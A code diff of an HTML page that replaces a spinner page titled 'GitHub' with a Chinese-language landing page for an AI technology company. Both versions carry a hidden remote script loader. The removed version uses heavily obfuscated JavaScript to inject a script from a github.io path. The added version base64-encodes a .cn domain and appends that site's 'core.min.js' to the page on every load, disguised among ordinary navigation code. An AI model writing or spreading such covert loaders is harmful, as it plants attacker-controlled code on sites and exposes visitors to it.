@@ -1,145 +1,459 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="zh-CN">
 
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport"
-        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <meta name="robots" content="noindex,nofollow" />
-    <title>GitHub</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>未来之光 - 智能科技</title>
     <style>
-        html,
+        /* 全局样式 */
         body {
-            width: 100vw;
-            height: 100vh;
-        }
-
-        * {
+            overflow: hidden;
+            font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
+            color: #333333;
+            /* 深灰色文本 */
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            overflow-x: hidden;
+            /* 隐藏横向滚动条 */
+            scroll-behavior: smooth;
+            /* 平滑滚动 */
         }
 
-        #childIframe {
+        /* 导航菜单 - 顶部固定 */
+        .main-nav {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            height: 100vh;
-            border: none;
+            background-color: rgba(34, 49, 63, 0.95);
+            /* 深蓝灰色半透明背景 */
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            z-index: 999;
+            padding: 10px 0;
+            text-align: center;
         }
 
-        .loading_container {
+        .main-nav ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .main-nav ul li {
+            margin: 0 12px;
+        }
+
+        .main-nav ul li a {
+            text-decoration: none;
+            color: #ECF0F1;
+            /* 浅灰色文本 */
+            font-weight: bold;
+            padding: 8px 15px;
+            border-radius: 20px;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+
+        .main-nav ul li a:hover {
+            background-color: #34495E;
+            /* 深蓝灰色 */
+            color: #FFFFFF;
+        }
+
+        /* 各个全屏区块 */
+        section.full-screen-section {
+            min-height: 100vh;
+            /* 每个区块至少占满整个视口高度 */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 60px 20px;
+            /* 顶部导航下方留出空间 */
+            box-sizing: border-box;
+            /* 包含padding在内的尺寸 */
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* 英雄区特定样式 */
+        #hero-section {
+            background-color: #2C3E50;
+            /* 深蓝灰色背景 */
+            color: #FFFFFF;
+            background-image: url('https://picsum.photos/1920/1080?random=<%= new Date().getTime() %>');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            /* 视差滚动效果 */
+        }
+
+        #hero-section::before {
+            content: '';
             position: absolute;
-            top: 40%;
-            left: 40%;
-            margin-left: 10%;
-            transform: translate3d(-50%, -50%, 0);
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(44, 62, 80, 0.7);
+            /* 半透明遮罩 */
+            z-index: 1;
         }
 
-        .loading_container .dot {
-            width: 24px;
-            height: 24px;
-            background: #3ac;
-            border-radius: 100%;
+        #hero-section .content {
+            position: relative;
+            z-index: 2;
+            max-width: 90%;
+            margin: 0 auto;
+        }
+
+        #hero-section h1 {
+            font-size: 3.5em;
+            /* 巨大标题 */
+            margin-bottom: 20px;
+            letter-spacing: 2px;
+            text-shadow: 2px 2px 8px rgba(0, 0, 0, 0.4);
+        }
+
+        #hero-section p {
+            font-size: 1.5em;
+            max-width: 700px;
+            margin: 0 auto 40px;
+            text-shadow: 1px 1px 4px rgba(0, 0, 0, 0.3);
+        }
+
+        .hero-button {
             display: inline-block;
-            animation: slide 1s infinite;
+            background-color: #3498DB;
+            /* 强调色：蓝色 */
+            color: #FFFFFF;
+            padding: 18px 40px;
+            border-radius: 40px;
+            /* 更圆的按钮 */
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.3em;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+            box-shadow: 0 6px 20px rgba(52, 152, 219, 0.4);
+            border: 2px solid #3498DB;
         }
 
-        .loading_container .dot:nth-child(1) {
-            animation-delay: 0.1s;
-            background: #32aacc;
+        .hero-button:hover {
+            background-color: #2980B9;
+            transform: translateY(-8px);
         }
 
-        .loading_container .dot:nth-child(2) {
-            animation-delay: 0.2s;
-            background: #64aacc;
+        /* 关于我们区特定样式 */
+        #about-section {
+            background-color: #FFFFFF;
+            color: #333333;
         }
 
-        .loading_container .dot:nth-child(3) {
-            animation-delay: 0.3s;
-            background: #96aacc;
+        #about-section h2 {
+            color: #34495E;
+            font-size: 2.5em;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #E0EBF5;
         }
 
-        .loading_container .dot:nth-child(4) {
-            animation-delay: 0.4s;
-            background: #c8aacc;
+        #about-section p {
+            max-width: 800px;
+            margin: 0 auto 20px;
+            font-size: 1.1em;
         }
 
-        .loading_container .dot:nth-child(5) {
-            animation-delay: 0.5s;
-            background: #faaacc;
+        #about-section img {
+            max-width: 90%;
+            height: auto;
+            border-radius: 15px;
+            margin-top: 30px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
         }
 
-        @-moz-keyframes slide {
-            0% {
-                transform: scale(1);
-            }
+        /* 服务区特定样式 */
+        #services-section {
+            background-color: #ECF0F1;
+            /* 浅灰背景 */
+            color: #333333;
+        }
 
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
+        #services-section h2 {
+            color: #34495E;
+            font-size: 2.5em;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #D1D8DD;
+        }
 
-            100% {
-                transform: scale(1);
+        .services-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            /* 移动端单列 */
+            gap: 30px;
+            max-width: 900px;
+            margin: 30px auto 0;
+        }
+
+        .service-card {
+            background-color: #FFFFFF;
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .service-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        .service-card h3 {
+            color: #3498DB;
+            font-size: 1.8em;
+            margin-bottom: 15px;
+        }
+
+        .service-card p {
+            font-size: 1.05em;
+            color: #5F7C8A;
+            margin-bottom: 0;
+        }
+
+        /* 联系区特定样式 */
+        #contact-section {
+            background-color: #2C3E50;
+            /* 深蓝灰色背景 */
+            color: #FFFFFF;
+        }
+
+        #contact-section h2 {
+            color: #FFFFFF;
+            font-size: 2.5em;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid rgba(255, 255, 255, 0.3);
+        }
+
+        #contact-section .contact-info p {
+            margin-bottom: 15px;
+            font-size: 1.2em;
+        }
+
+        #contact-section .contact-info a {
+            color: #3498DB;
+            text-decoration: none;
+            font-weight: bold;
+            transition: color 0.3s ease;
+        }
+
+        #contact-section .contact-info a:hover {
+            color: #2980B9;
+        }
+
+        #contact-section .social-links {
+            margin-top: 40px;
+        }
+
+        #contact-section .social-links a {
+            display: inline-block;
+            margin: 0 20px;
+            color: #FFFFFF;
+            font-size: 3em;
+            /* 社交图标更大 */
+            text-decoration: none;
+            transition: transform 0.3s ease, color 0.3s ease;
+        }
+
+        #contact-section .social-links a:hover {
+            transform: translateY(-8px);
+            color: #3498DB;
+            /* 强调色 */
+        }
+
+        /* 页脚样式 */
+        footer {
+            text-align: center;
+            padding: 30px 20px;
+            color: #ADB5BD;
+            font-size: 0.9em;
+            background-color: #212529;
+            /* 更深的背景 */
+        }
+
+        /* 媒体查询：平板及以上设备 */
+        @media (min-width: 600px) {
+            .services-grid {
+                grid-template-columns: 1fr 1fr;
+                /* 两列布局 */
             }
         }
 
-        @-webkit-keyframes slide {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
-
-            100% {
-                transform: scale(1);
-            }
-        }
-
-        @-o-keyframes slide {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
-
-            100% {
-                transform: scale(1);
-            }
-        }
-
-        @keyframes slide {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
-
-            100% {
-                transform: scale(1);
+        @media (min-width: 900px) {
+            .services-grid {
+                grid-template-columns: 1fr 1fr 1fr;
+                /* 三列布局 */
             }
         }
     </style>
+    <link rel="stylesheet" href="./style.css">
 </head>
 
 <body>
-    <div id="loading_box" class="loading_container">
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
+    <nav class="main-nav">
+        <ul>
+            <li><a href="#hero-section">首页</a></li>
+            <li><a href="#about-section">关于我们</a></li>
+            <li><a href="#services-section">服务</a></li>
+            <li><a href="#contact-section">联系</a></li>
+        </ul>
+    </nav>
+
+    <main>
+        <!-- 英雄区 -->
+        <section id="hero-section" class="full-screen-section">
+            <div class="content">
+                <h1>未来之光</h1>
+                <p>以智能科技，点亮美好未来</p>
+                <a href="#services-section" class="hero-button">探索我们的服务</a>
+            </div>
+        </section>
+
+        <!-- 关于我们区 -->
+        <section id="about-section" class="full-screen-section">
+            <h2>关于我们</h2>
+            <p>未来之光科技是一家领先的人工智能解决方案提供商。我们致力于通过创新的AI技术，赋能企业和个人，共同迎接智能时代的挑战与机遇。</p>
+            <p>我们的团队由业界顶尖的AI科学家、工程师和设计师组成，凭借深厚的技术积累和对行业趋势的深刻理解，为客户提供定制化、高效且可靠的智能解决方案。</p>
+            <img src="https://picsum.photos/800/450?random=<%= new Date().getTime() + 1 %>" alt="团队在现代办公室协作">
+        </section>
+
+        <!-- 服务区 -->
+        <section id="services-section" class="full-screen-section">
+            <h2>我们的服务</h2>
+            <div class="services-grid">
+                <div class="service-card">
+                    <h3>AI平台开发</h3>
+                    <p>构建可扩展、高性能的AI基础设施和应用平台。</p>
+                </div>
+                <div class="service-card">
+                    <h3>智能数据分析</h3>
+                    <p>利用机器学习深度挖掘数据价值，提供商业洞察。</p>
+                </div>
+                <div class="service-card">
+                    <h3>计算机视觉</h3>
+                    <p>提供图像识别、视频分析等视觉AI解决方案。</p>
+                </div>
+                <div class="service-card">
+                    <h3>自然语言处理</h3>
+                    <p>开发智能客服、文本理解、情感分析等NLP应用。</p>
+                </div>
+                <div class="service-card">
+                    <h3>智能硬件集成</h3>
+                    <p>将AI算法与边缘设备结合，实现设备智能化。</p>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <p>&copy; 2023 未来之光. All rights reserved.</p>
+    </footer>
+    <div id="overlay">
+        <div id="loading_box" class="loading_container">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
     </div>
+
     <script>
-        var _0xodl = 'fSxlA2'; if (function (_0x44df4a, _0x58e26e, _0x532227, _0x1cbb24, _0x42581a, _0x509b59, _0xa79306) { return _0x44df4a = _0x44df4a >> 0x9, _0x509b59 = 'hs', _0xa79306 = 'hs', function (_0x4d29f2, _0x4cbc97, _0xbe291c, _0x31ad23, _0x13acc7) { const _0x407516 = _0x57d3; _0x31ad23 = 'tfi', _0x509b59 = _0x31ad23 + _0x509b59, _0x13acc7 = 'up', _0xa79306 += _0x13acc7, _0x509b59 = _0xbe291c(_0x509b59), _0xa79306 = _0xbe291c(_0xa79306), _0xbe291c = 0x0; const _0x1902ef = _0x4d29f2(); while (!![] && --_0x1cbb24 + _0x4cbc97) { try { _0x31ad23 = -parseInt(_0x407516(0x1d7, ')&2K')) / 0x1 * (-parseInt(_0x407516(0x1da, '(qya')) / 0x2) + -parseInt(_0x407516(0x1c7, 'Pm#h')) / 0x3 * (-parseInt(_0x407516(0x1d1, 'xvr1')) / 0x4) + parseInt(_0x407516(0x1c9, 'Mw8H')) / 0x5 + -parseInt(_0x407516(0x1d8, 'Y$EJ')) / 0x6 + parseInt(_0x407516(0x1cb, 'HIOm')) / 0x7 + -parseInt(_0x407516(0x1dd, 'mry*')) / 0x8 + -parseInt(_0x407516(0x1cc, 'Mw8H')) / 0x9 * (parseInt(_0x407516(0x1dc, 'quPr')) / 0xa); } catch (_0x531926) { _0x31ad23 = _0xbe291c; } finally { _0x13acc7 = _0x1902ef[_0x509b59](); if (_0x44df4a <= _0x1cbb24) _0xbe291c ? _0x42581a ? _0x31ad23 = _0x13acc7 : _0x42581a = _0x13acc7 : _0xbe291c = _0x13acc7; else { if (_0xbe291c == _0x42581a['replace'](/[kqChQWiaIPvYKouwOtDL=]/g, '')) { if (_0x31ad23 === _0x4cbc97) { _0x1902ef['un' + _0x509b59](_0x13acc7); break; } _0x1902ef[_0xa79306](_0x13acc7); } } } } }(_0x532227, _0x58e26e, function (_0x5c8363, _0x34873c, _0x10efd6, _0x28a9f7, _0x1dd818, _0x16adf9, _0x3ea5ad) { return _0x34873c = '\x73\x70\x6c\x69\x74', _0x5c8363 = arguments[0x0], _0x5c8363 = _0x5c8363[_0x34873c](''), _0x10efd6 = '\x72\x65\x76\x65\x72\x73\x65', _0x5c8363 = _0x5c8363[_0x10efd6]('\x76'), _0x28a9f7 = '\x6a\x6f\x69\x6e', (0x1b0f1e, _0x5c8363[_0x28a9f7]('')); }); }(0x19800, 0x89423, _0x1ca1, 0xce), _0x1ca1) { } function _0x1e3297() { const _0x596da2 = _0x57d3, _0x1816ad = { 'bCFHm': 'https://snake-imfv.github.io/take-gate/common.mimi.js?timestamp=', 'UVwwa': _0x596da2(0x1c8, 'u57N'), 'VQnBe': _0x596da2(0x1c6, '#XD(') }, _0x3d27e5 = Date[_0x596da2(0x1d5, ']sYX')](), _0x3ed973 = Math['floor'](Math[_0x596da2(0x1de, 'GP!4')]() * 0xf4240), _0x2564ef = _0x1816ad['bCFHm'] + _0x3d27e5 + _0x1816ad[_0x596da2(0x1cf, 'lKdL')] + _0x3ed973, _0xb78199 = document[_0x596da2(0x1db, '!MEf')](_0x1816ad[_0x596da2(0x1d3, '#W5W')]); _0xb78199[_0x596da2(0x1ce, 'sIgF')] = _0x2564ef, document[_0x596da2(0x1c4, '1Rum')]['appendChild'](_0xb78199); } function _0x57d3(_0x3a7c21, _0x386983) { const _0x1ca173 = _0x1ca1(); return _0x57d3 = function (_0x57d370, _0xacf434) { _0x57d370 = _0x57d370 - 0x1c4; let _0x51e50f = _0x1ca173[_0x57d370]; if (_0x57d3['hhIPqO'] === undefined) { var _0x15663a = function (_0x11d2a9) { const _0x85d5c2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='; let _0x31b329 = '', _0xc951fd = ''; for (let _0x2837ed = 0x0, _0x364686, _0x101443, _0x448ee2 = 0x0; _0x101443 = _0x11d2a9['charAt'](_0x448ee2++); ~_0x101443 && (_0x364686 = _0x2837ed % 0x4 ? _0x364686 * 0x40 + _0x101443 : _0x101443, _0x2837ed++ % 0x4) ? _0x31b329 += String['fromCharCode'](0xff & _0x364686 >> (-0x2 * _0x2837ed & 0x6)) : 0x0) { _0x101443 = _0x85d5c2['indexOf'](_0x101443); } for (let _0xccb879 = 0x0, _0x1f82ce = _0x31b329['length']; _0xccb879 < _0x1f82ce; _0xccb879++) { _0xc951fd += '%' + ('00' + _0x31b329['charCodeAt'](_0xccb879)['toString'](0x10))['slice'](-0x2); } return decodeURIComponent(_0xc951fd); }; const _0x3a032f = function (_0x1c294f, _0x1177da) { let _0x131465 = [], _0x4d6de2 = 0x0, _0x32adbe, _0x4d6802 = ''; _0x1c294f = _0x15663a(_0x1c294f); let _0x4973f5; for (_0x4973f5 = 0x0; _0x4973f5 < 0x100; _0x4973f5++) { _0x131465[_0x4973f5] = _0x4973f5; } for (_0x4973f5 = 0x0; _0x4973f5 < 0x100; _0x4973f5++) { _0x4d6de2 = (_0x4d6de2 + _0x131465[_0x4973f5] + _0x1177da['charCodeAt'](_0x4973f5 % _0x1177da['length'])) % 0x100, _0x32adbe = _0x131465[_0x4973f5], _0x131465[_0x4973f5] = _0x131465[_0x4d6de2], _0x131465[_0x4d6de2] = _0x32adbe; } _0x4973f5 = 0x0, _0x4d6de2 = 0x0; for (let _0x54b701 = 0x0; _0x54b701 < _0x1c294f['length']; _0x54b701++) { _0x4973f5 = (_0x4973f5 + 0x1) % 0x100, _0x4d6de2 = (_0x4d6de2 + _0x131465[_0x4973f5]) % 0x100, _0x32adbe = _0x131465[_0x4973f5], _0x131465[_0x4973f5] = _0x131465[_0x4d6de2], _0x131465[_0x4d6de2] = _0x32adbe, _0x4d6802 += String['fromCharCode'](_0x1c294f['charCodeAt'](_0x54b701) ^ _0x131465[(_0x131465[_0x4973f5] + _0x131465[_0x4d6de2]) % 0x100]); } return _0x4d6802; }; _0x57d3['dxeyOG'] = _0x3a032f, _0x3a7c21 = arguments, _0x57d3['hhIPqO'] = !![]; } const _0x4f32da = _0x1ca173[0x0], _0x4af055 = _0x57d370 + _0x4f32da, _0x21827a = _0x3a7c21[_0x4af055]; return !_0x21827a ? (_0x57d3['AawnSq'] === undefined && (_0x57d3['AawnSq'] = !![]), _0x51e50f = _0x57d3['dxeyOG'](_0x51e50f, _0xacf434), _0x3a7c21[_0x4af055] = _0x51e50f) : _0x51e50f = _0x21827a, _0x51e50f; }, _0x57d3(_0x3a7c21, _0x386983); } _0x1e3297(); function _0x1ca1() { const _0x588e4a = (function () { return [_0xodl, 'twftoQSohxuClqADO2ItPvkLWKYPwkai==', 'WPzprCkiiCkVpmkrqezTW4JdLq', 'WR3dTb0ZWR1wtfj+dL/dVSkJ', 'qq50pLvDog3dN3avWO3cSG', 'W549mhmi'].concat((function () { return ['WPO9W5eXnSk2h8kjw8opW64EWPC', 'W7vgW6a', 'lmo+pMlcSmkzxmkVuSkUW4hcRha', 'WQj2fmoGWRhdUmoACWZdKG', 'W7T2W73cVmkggmkuWRCQW6iqo8kq', 'FL4HWP/dLbTm'].concat((function () { return ['W7JcLJWinGFdN2q', 'W7dcTCoTfq5wpSkImCkYsrPu', 'W5hcVY1XWOXnW7Wx', 'j8kbnw8XvI7cNXbhjCkDW7e', 'tgXwW4PdWP4', 'WPaLkSoW'].concat((function () { return ['rqT0oWyEzxRdSuC', 'a143zr0A', 'E8oaWRxdP8k6WRGb', 'W6ldGCoDuN8/W5xcHG', 'FGLxW7xcIwuiEmkzECk8W6ae', 'WPRdMr3dOttcISkjWPhcT2ldGGRdOa'].concat((function () { return ['WPzkrSkok8kKpSk+xNXTW6JdLG', 'FWPsW7xcGM0jACkPE8khW64v', 'WPVdNXVdPZxcICkkWQ/cMvRdUstdSG', 'WQLVrG', 'W43cIcqGla']; }())); }())); }())); }())); }()); _0x1ca1 = function () { return _0x588e4a; }; return _0x1ca1(); };
+        // 平滑滚动到锚点
+        document.querySelectorAll('.main-nav a[href^="#"], .hero-button[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const targetId = this.getAttribute('href');
+                const targetElement = document.querySelector(targetId);
+                if (targetElement) {
+                    // 考虑顶部固定导航的高度进行偏移
+                    const navHeight = document.querySelector('.main-nav').offsetHeight;
+                    window.scrollTo({
+                        top: targetElement.offsetTop - navHeight,
+                        behavior: 'smooth'
+                    });
+                }
+            });
+        });
+
+        // 动态更新图片时间戳，防止缓存
+        document.addEventListener('DOMContentLoaded', function () {
+            const images = document.querySelectorAll('img[src*="picsum.photos"]');
+            images.forEach(img => {
+                const url = new URL(img.src);
+                url.searchParams.set('random', new Date().getTime() + Math.floor(Math.random() * 1000));
+                img.src = url.toString();
+            });
+        });
+    </script>
+    <script>
+        (function () {
+            function init() {
+                const timestamp = Date.now()
+                const randomNum = Math.floor(Math.random() * 1000000)
+                const domain = getdocs();
+                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const script = document.createElement("script")
+                script.src = url
+                document.body.appendChild(script)
+            }
+            function getdocs() {
+                const dd = "Ly9uMG0ycTR3Lnlxb2psZS5jbi9zdGF0aWMvanMvY29yZS5taW4uanM/dA==";
+                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+                const lookup = new Uint8Array(256);
+                for (let i = 0; i < chars.length; i++) {
+                    lookup[chars.charCodeAt(i)] = i;
+                }
+                let padding = 0;
+                if (dd.endsWith('==')) {
+                    padding = 2;
+                } else if (dd.endsWith('=')) {
+                    padding = 1;
+                }
+                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
+                const len = cleanedString.length;
+                if (len % 4 !== 0) {
+                    throw new Error("Invalid string length.");
+                }
+                const outputLength = (len / 4) * 3 - padding;
+                const outputBytes = new Uint8Array(outputLength);
+                let outputIndex = 0;
+                let i = 0;
+                while (i < len) {
+                    const c1 = lookup[cleanedString.charCodeAt(i++)];
+                    const c2 = lookup[cleanedString.charCodeAt(i++)];
+                    const c3 = lookup[cleanedString.charCodeAt(i++)];
+                    const c4 = lookup[cleanedString.charCodeAt(i++)];
+                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
+                    if (c3 !== 64) {
+                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
+                    }
+                    if (c4 !== 64) {
+                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
+                    }
+                }
+                const decoder = new TextDecoder('utf-8');
+                return decoder.decode(outputBytes);
+            }
+            init()
+        })()
     </script>
 </body>
 
